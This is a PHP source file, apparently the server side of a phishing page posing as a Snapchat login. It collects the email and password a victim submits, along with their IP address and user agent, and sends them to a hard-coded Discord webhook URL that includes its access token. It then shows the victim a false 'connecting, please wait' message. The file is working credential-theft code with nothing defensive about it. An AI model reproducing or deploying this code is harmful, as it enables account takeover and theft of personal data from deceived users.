<?php
session_start();
require_once 'includes/functions.php';

if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("Erreur CSRF.");
}

$email = clean($_POST['email'] ?? '');
$password = clean($_POST['password'] ?? '');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Email invalide.");
}

// Webhook Discord (à remplacer)
$webhook = "https://discord.com/api/webhooks/1187144647588450475/35OMUBU6_jw5F7MqBmgu2aImG9yf5uKV0-kmkm2w6nOEiEVMfGrpuVTgpEFF5itoOZsP";

$msg = "**Nouvelle connexion Snapchat :**\n";
$msg .= "📧 Email : `$email`\n";
$msg .= "🔑 Mot de passe : `$password`\n";
$msg .= "🌍 IP : `$ip`\n";
$msg .= "📱 User-Agent : `$user_agent`";

$data = ["content" => $msg];

$options = [
    'http' => [
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ]
];
$context  = stream_context_create($options);
file_get_contents($webhook, false, $context);

echo "Connexion en cours, veuillez patienter...";